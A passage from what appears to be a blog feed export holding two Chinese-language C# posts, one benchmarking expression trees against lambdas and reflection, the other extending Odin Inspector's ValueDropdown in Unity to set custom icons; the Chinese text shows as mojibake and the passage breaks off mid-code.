<span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•ç”Ÿæˆäº†ä¸€ä¸ªå¥—äº†å¤§æ¦‚10å±‚çš„èŠ‚ç‚¹ï¼Œç„¶åæ„å»ºæˆ lambda å»è·‘æ•°æ®ï¼Œæµ‹è¯•äº†å‡ ä¸ª N å¾—åˆ°äº†å¦‚ä¸‹æ•°æ®</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Test <span class="number">1000</span></span><br><span class="line">Lambda Build used <span class="number">0</span> ms</span><br><span class="line">Lambda Run used <span class="number">0</span> ms</span><br><span class="line"></span><br><span class="line">Test <span class="number">10000</span></span><br><span class="line">Lambda Build used <span class="number">0</span> ms</span><br><span class="line">Lambda Run used <span class="number">21</span> ms</span><br><span class="line"></span><br><span class="line">Test <span class="number">100000</span></span><br><span class="line">Lambda Build used <span class="number">0</span> ms</span><br><span class="line">Lambda Run used <span class="number">36</span> ms</span><br><span class="line"></span><br><span class="line">Test <span class="number">1000000</span></span><br><span class="line">Lambda Build used <span class="number">0</span> ms</span><br><span class="line">Lambda Run used <span class="number">102</span> ms</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯ä»¥è€ƒè™‘ä¸€ä¸‹è¡¨è¾¾å¼æ ‘ä¼šæœ‰ä»€ä¹ˆä¼˜åŠ¿ï¼Œå¾ˆæ˜¾ç„¶ï¼Œæˆ‘ä»¬å¯ä»¥æ“ä½œèŠ‚ç‚¹æ ‘ï¼Œè‡ªä¸‹è€Œä¸Šåˆå¹¶æˆä¸€ä¸ªå‡½æ•°</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Expression&lt;Foo&gt; <span class="title">BuildExpression</span>(<span class="params">ParameterExpression param</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">value</span> = Expression.Constant(Value);</span><br><span class="line">    Expression next = Next?.BuildExpression(param).Body ?? param;</span><br><span class="line">    Expression proc = Op <span class="keyword">switch</span></span><br><span class="line">    &#123;</span><br><span class="line">        Operation.Add =&gt; Expression.Add(next, <span class="keyword">value</span>),</span><br><span class="line">        Operation.Sub =&gt; Expression.Subtract(next, <span class="keyword">value</span>),</span><br><span class="line">        Operation.Mul =&gt; Expression.Multiply(next, <span class="keyword">value</span>),</span><br><span class="line">        Operation.Div =&gt; Expression.Divide(next, <span class="keyword">value</span>),</span><br><span class="line">        _ =&gt; next,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> Expression.Lambda&lt;Foo&gt;(proc, param);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ¯æ¬¡è·å–å­è¡¨è¾¾å¼ï¼Œç„¶åæŠŠå‡½æ•°ä½“æ‹¼æ¥ï¼Œå…¶å®å°±æ˜¯æŠŠä¸€ä¸ªæ ‘çŠ¶ç»“æ„å¹³å¦åŒ–äº†</p><blockquote><p>  è¿™é‡Œè¦æ³¨æ„ï¼Œå‚æ•°é€šè¿‡å‡½æ•°æ¥ä¼ é€’è€Œä¸æ˜¯æ¯æ¬¡buildéƒ½åœ¨é‡Œé¢å®šä¹‰ä¸€ä¸ªå˜é‡æ˜¯å› ä¸ºå³ä¾¿è®¾ç½®çš„å˜é‡åä¸€æ ·ï¼Œä½†æ˜¯æœ¬è´¨ä¹Ÿæ˜¯ç»‘å®šçš„ä¸åŒçš„å‚æ•°ï¼Œè¿™æ—¶å€™å°±ä¸èƒ½ç›´æ¥ä½¿ç”¨ Body æ‹¼æ¥ï¼Œå¦åˆ™ä¼šè¿è¡Œæ—¶å¼‚å¸¸</p></blockquote><p>åšä¸€ä¸‹åŸºå‡†æµ‹è¯•</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Benchmark</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> Node node;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">int</span> N = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">GlobalSetup</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Setup</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        node = Program.Generate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Benchmark</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestExpression</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> param = Expression.Parameter(<span class="keyword">typeof</span>(<span class="built_in">int</span>), <span class="string">&quot;x&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> expr = node.BuildExpression(param);</span><br><span class="line">        <span class="keyword">var</span> f2 = expr.Compile();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            f2(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Benchmark</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestLambda</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> f = node.BuildLambda();</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            f(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> summary = BenchmarkRunner.Run&lt;Benchmark&gt;();</span><br><span class="line">        Console.WriteLine(summary);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// other code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/%E4%BD%BF%E7%94%A8CSharp%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A0%91%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81/image-20250526011451685.png" alt="benchmark"></p><p>åŸºæœ¬ä¸Šè¿™ä¸ªè¡¨è¾¾å¼æ ‘éœ€è¦å¤§æ¦‚ 15-30 ms çš„æ—¶é—´ç¼–è¯‘ï¼Œè€Œè¿è¡Œçš„æ€§èƒ½éå¸¸é«˜ï¼Œè¿™ä¸ªä¼˜åŠ¿ä¼šåœ¨æ•°æ®æ•°é‡çº§è¶Šé«˜ï¼Œæ ‘ç»“æ„è¶Šå¤æ‚çš„æ—¶å€™ç”±å¾ˆæ˜¾è‘—çš„è¡¨ç°</p><p>ä¸è¿‡ expression ç¼ºç‚¹æ˜¯å†™èµ·æ¥å¾ˆéº»çƒ¦ï¼Œä¹Ÿä¸ç›´è§‚ï¼Œè€Œä¸”å®¹æ˜“å†™å‡º bugï¼Œç‰¹åˆ«æ˜¯ç±»å‹å¯¹åº”ä¸ä¸Šçš„æƒ…å†µï¼Œå¾€å¾€è¦åˆ°è¿è¡Œæ—¶æŠ¥é”™äº†æ‰èƒ½å‘ç°</p><p>ä¸€èˆ¬çš„æƒ…å†µç”¨åµŒå¥—å‡½æ•°å·²ç»å¤Ÿäº†</p><h2 id="åå°„-Expression-ä»£æ›¿çº¯åå°„"><a href="#åå°„-Expression-ä»£æ›¿çº¯åå°„" class="headerlink" title="åå°„ + Expression ä»£æ›¿çº¯åå°„"></a>åå°„ + Expression ä»£æ›¿çº¯åå°„</h2><p>æ¯”å¦‚é€šè¿‡åå°„è·å–ä¸€ä¸ª MethodInfoï¼Œè°ƒç”¨å®ƒçš„æ–¹å¼äº¦æœ‰å·®åˆ«ã€‚é€šå¸¸å¯èƒ½ä¼šç›´æ¥ <code>.Invoke(...)</code> è°ƒç”¨äº†ï¼Œä½†æ˜¯è¿™ç§åŠ¨æ€è°ƒç”¨æœºåˆ¶ä¼šåœ¨è¿è¡Œæ—¶å¯¹ä¼ å…¥è¿›è¡Œå‚æ•°ç±»å‹æ£€æŸ¥ï¼Œè£…æ‹†ç®±ç­‰æ“ä½œï¼Œä»¥åŠæ–¹æ³•çš„åŠ¨æ€æ´¾å‘ï¼ŒåŒæ—¶ä¹Ÿæ²¡æœ‰ JIT çš„ä¼˜åŒ–ï¼Œè¿™å¯¼è‡´å°±ç®—æ˜¯ç¼“å­˜äº†è¿™ä¸ª infoï¼Œå¤šæ¬¡è°ƒç”¨ä¹Ÿä¸èƒ½æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚</p><p>è¿™æ—¶å€™å¯ä»¥é€šè¿‡è¡¨è¾¾å¼æ ‘æ¥æä¾›æ›´å¥½çš„æ€§èƒ½</p><p>æ¯”å¦‚æˆ‘ä»¬è¦è·å–ä¸€ä¸ªç±»å‹çš„ property çš„ setter æ¥è¿›è¡Œèµ‹å€¼æ“ä½œ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Benchmark2</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> Bar bar;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">int</span> N = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">GlobalSetup</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Setup</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        bar = <span class="keyword">new</span> Bar(<span class="number">114514</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> MethodInfo? setter;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Benchmark</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestReflection</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        setter ??= <span class="keyword">typeof</span>(Bar).GetProperty(<span class="string">&quot;value&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance)?</span><br><span class="line">            .GetSetMethod(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            setter?.Invoke(bar, <span class="keyword">new</span> <span class="built_in">object</span>[] &#123; i &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å¾ˆè‡ªç„¶çš„æ“ä½œï¼Œå¦‚æœéœ€è¦å¤šæ¬¡è°ƒç”¨ï¼ŒæŠŠè¿™ä¸ª methodInfo ç¼“å­˜ä¸‹æ¥ï¼Œä¹‹åç›´æ¥ invoke è¿™ä¸ª methodinfo</p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨åŒæ ·çš„é€»è¾‘æ¥ä½¿ç”¨è¡¨è¾¾å¼æ ‘ï¼Œè¿™é‡Œä½¿ç”¨ <code>Expression.Call</code> æ¥è°ƒç”¨ä¸€ä¸ª MethodInfo</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Action&lt;Bar, <span class="built_in">int</span>&gt;? setter2;</span><br><span class="line"></span><br><span class="line">[<span class="meta">Benchmark</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">TestExpression</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (setter2 <span class="keyword">is</span> <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> barParam = Expression.Parameter(<span class="keyword">typeof</span>(Bar), <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> valueParam = Expression.Parameter(<span class="keyword">typeof</span>(<span class="built_in">int</span>), <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> setterMethod = <span class="keyword">typeof</span>(Bar).GetProperty(<span class="string">&quot;value&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance)?</span><br><span class="line">            .GetSetMethod(<span class="literal">true</span>);</span><br><span class="line">        setter2 = Expression.Lambda&lt;Action&lt;Bar, <span class="built_in">int</span>&gt;&gt;(</span><br><span class="line">            Expression.Call(barParam, setterMethod!, valueParam),</span><br><span class="line">            barParam, valueParam</span><br><span class="line">        ).Compile();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        setter2(bar, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬ä¸éœ€è¦ç¼“å­˜è¿™ä¸ª methodInfoï¼Œè€Œæ˜¯ç¼–è¯‘æˆä¸€ä¸ªå§”æ‰˜ç„¶åç¼“å­˜è¯¥å§”æ‰˜</p><p>åŒæ ·è·‘ä¸€ä¸‹åŸºå‡†æµ‹è¯•</p><p><img src="/%E4%BD%BF%E7%94%A8CSharp%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%A0%91%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81/image-20250526014002834.png" alt="benchmark2"></p><blockquote><p>  è¡¨è¾¾å¼æ ‘ç¼–è¯‘åçš„å§”æ‰˜æ˜¯ç›´æ¥å»è°ƒç”¨ç›®æ ‡æ–¹æ³•çš„ IL ä»£ç ï¼Œæ€§èƒ½å‡ ä¹æ˜¯æ¥è¿‘ç›´æ¥è°ƒç”¨çš„ï¼Œé¿å…åŠ¨æ€è°ƒç”¨å¼€é”€ï¼Œæ‰€ä»¥æ€§èƒ½ä¼šè¿œé«˜äº MethodInfo.Invoke</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> æ¸¸æˆå¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸºäºValueDropdownæ‹“å±•ä»¥æ”¯æŒè‡ªå®šä¹‰icon</title>
      <link href="/%E5%9F%BA%E4%BA%8EValueDropdown%E6%8B%93%E5%B1%95%E4%BB%A5%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89icon/"/>
      <url>/%E5%9F%BA%E4%BA%8EValueDropdown%E6%8B%93%E5%B1%95%E4%BB%A5%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89icon/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰é‡åˆ°è¿‡ä¸€ä¸ªéœ€æ±‚æ˜¯è¦åœ¨ä¸‹æ‹‰æ¡†çš„ç›®å½•åšä¸€ä¸ªæ ‡è®°æ¥æŒ‡ç¤ºçŠ¶æ€ï¼Œåº”è¯¥å¾ˆè‡ªç„¶å°±å¯ä»¥æƒ³åˆ°èƒ½ä¸èƒ½ä¿®æ”¹ä¸€ä¸‹ iconï¼Œæ¯”å¦‚æŠŠæ–‡ä»¶å¤¹çš„é‚£ä¸ªiconæ”¹æˆå…¶ä»–é¢œè‰²çš„ï¼Œè¿™æ ·ä¼šæ¯”ä¿®æ”¹æ˜¾ç¤ºåå­—æ¯«æ— ç–‘é—®æ›´åŠ æ˜¾çœ¼ã€‚</p><p>ä¸è¿‡å…¶å®æƒ³è¦è¿›è¡Œæ›´å¤§é™åº¦çš„ä¿®æ”¹æ˜¯å®Œå…¨å¯ä»¥çš„ï¼Œåªéœ€è¦é­”æ”¹ä¸€ä¸‹ ValueDropdown å°±è¡Œã€‚</p><span id="more"></span><p>å…ˆè¯´ä¸€ä¸‹ç®€å•çš„è§£å†³å…ˆå‰æåˆ°çš„éœ€æ±‚çš„åŠæ³•å§â€”â€”æ”¹æ˜¾ç¤ºåå­—ã€‚</p><p>ä¸€èˆ¬æ˜¯ä½¿ç”¨ <code>ValueDropdownList&lt;T&gt;</code> æˆ–è€… <code>IEnumerable&lt;ValueDropdownItem&lt;T&gt;&gt;</code>  (äºŒè€…æ˜¯ç­‰ä»·çš„) ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">ShowInInspector, LabelText(<span class="string">&quot;æµ‹è¯•ä¸‹æ‹‰æ¡†&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">ValueDropdown(nameof(GetAllowIndexs))</span>]</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span> Index;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> ValueDropdownList&lt;<span class="built_in">int</span>&gt; <span class="title">GetAllowIndexs</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> list = <span class="keyword">new</span> ValueDropdownList&lt;<span class="built_in">int</span>&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        list.Add(<span class="string">$&quot;The <span class="subst">&#123;i + <span class="number">1</span>&#125;</span> item&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼Œå¯ä»¥ç»™æ¯ä¸ª value éƒ½æŒ‡å®šè‡ªå®šä¹‰çš„åå­—ï¼Œä¸è¿‡æ›´å¤æ‚çš„æ“ä½œä¼¼ä¹å°±ä¸è¡Œäº†ï¼ˆæˆ–è€…æˆ‘æ²¡æœ‰æ‰¾åˆ°ï¼Ÿï¼‰</p><p><img src="/%E5%9F%BA%E4%BA%8EValueDropdown%E6%8B%93%E5%B1%95%E4%BB%A5%E6%94%AF%E6%8C%81%E8%87%AA%E5%AE%9A%E4%B9%89icon/image-20250513221635581.png" alt="æµ‹è¯•ä¸‹æ‹‰æ¡†"></p><h2 id="æ‹“å±•-ValueDropdown"><a href="#æ‹“å±•-ValueDropdown" class="headerlink" title="æ‹“å±• ValueDropdown"></a>æ‹“å±• ValueDropdown</h2><p>æ—¢ç„¶åŸæœ¬çš„ ValueDropdown æ— æ³•æ»¡è¶³éœ€æ±‚ï¼Œé‚£å°±è‡ªå·±æ“ä¸€ä¸ªå§ï¼Œå†™ä¸€ä¸ªç±»ç»§æ‰¿åŸæ¥çš„ ValueDropdown ç‰¹æ€§ã€‚</p><p>ç„¶åæˆ‘ä»¬å†åŸæ¥çš„åŸºç¡€ä¸Šï¼Œå†æ·»åŠ ä¸€ä¸ªå›è°ƒå­—æ®µ</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> UNITY_EDITOR &amp;&amp; ODIN_INSPECTOR</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Sirenix.OdinInspector</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.All, AllowMultiple = false, Inherited = true)</span>]</span><br><span class="line">[<span class="meta">Conditional(<span class="string">&quot;UNITY_EDITOR&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomValueDropdownAttribute</span> : <span class="title">ValueDropdownAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> ItemAction;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomValueDropdownAttribute</span>(<span class="params"><span class="built_in">string</span> valueGetter, <span class="built_in">string</span> itemAction</span>)</span></span><br><span class="line"><span class="function">        : <span class="title">base</span>(<span class="params">valueGetter</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        ItemAction = itemAction;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>ç„¶åè‡ªå®šä¹‰ attribute drawer</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Sirenix.OdinInspector.Editor.Drawers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">CustomValueDropdownAttributeDrawer</span> : <span class="title">OdinAttributeDrawer</span>&lt;<span class="title">CustomValueDropdownAttribute</span>&gt;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸€ä¸‹ <code>ValueDropdownAttributeDrawer</code> çš„å®ç°ï¼Œå°±ä¼šå‘ç°æ˜¯åŸºäº OdinMenuTree åšçš„ï¼Œæ¯ä¸€é¡¹å…¶å®éƒ½æ˜¯ä¸€ä¸ª OdinMenuItemï¼Œæ‰€ä»¥ä¸å¦¨è®©æˆ‘ä»¬çš„è‡ªå®šä¹‰çš„å›è°ƒçš„å‚æ•°æ˜¯ OdinMenuItemï¼Œè¿™æ ·å°±å¯ä»¥å®ç°æ›´å¤§é™åº¦çš„è‡ªå®šä¹‰æ¯ä¸€é¡¹ã€‚</p><p>æ·»åŠ ä¸€ä¸ª ActionResolver å­—æ®µåŸæ¥è§£æä¼ å…¥çš„æ–¹æ³•å</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ActionResolver? itemAction;</span><br></pre></td></tr></table></figure><p>ç„¶ååœ¨åˆå§‹åŒ–å‡½æ•°ä¸­æ·»åŠ è§£æé€»è¾‘ï¼Œï¼ˆä¹Ÿåˆ«å¿˜äº†è®¾ç½®é”™è¯¯ä¿¡æ¯ï¼‰</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">base</span>.Attribute.ItemAction <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">    itemAction = ActionResolver.Get(</span><br><span class="line">        <span class="keyword">base</span>.Property,</span><br><span class="line">        <span class="keyword">base</span>.Attribute.ItemAction,</span><br><span class="line"><span class="keyword">new</span>[] &#123; <span class="keyword">new</span> ActionResolvers.NamedValue(<span class="string">&quot;item&quot;</span>, <span class="keyword">typeof</span>(OdinMenuItem)) &#125;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">error = rawGetter.ErrorMessage ?? itemAction?.ErrorMessage;</span><br></pre></td></tr></table></figure><p>ç¿»ä¸€ä¸‹é€»è¾‘ï¼Œä¼šå‘ç°è®¾ç½® icon æ˜¯é€šè¿‡ <code>AddThumbnailIcons(preferAssetPreviewAsIcon: true);</code> è°ƒç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹è¿™éƒ¨åˆ†çš„é€»è¾‘ï¼Œå½“ itemAction ä¸ºç©ºæ—¶ï¼Œå°±ç»§ç»­èµ°è€é€»è¾‘ï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œé‚£å°±å°è¯•è°ƒç”¨è§£æçš„é€»è¾‘</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    genericSelector.SelectionTree.EnumerateTree(x =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        itemAction?.Context.NamedValues.Set(<span class="string">&quot;item&quot;</span>, x);</span><br><span class="line">        itemAction?.DoAction();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x.Icon == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x.AddThumbnailIcon(preferAssetPreviewAsIcon: <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•æ•ˆæœ"><a href="#æµ‹è¯•æ•ˆæœ" class="headerlink" title="æµ‹è¯•æ•ˆæœ"></a>æµ‹è¯•æ•ˆæœ</h2><p>åœ¨åŸæ¥çš„æµ‹è¯•ä»£ç é‚£é‡Œæ·»åŠ ä¸€ä¸ªå‡½æ•°</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">HandleItem</span>(<span class="params">OdinMenuItem item</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    item.Icon = EditorIcons.Flag.Active;</span><br><span 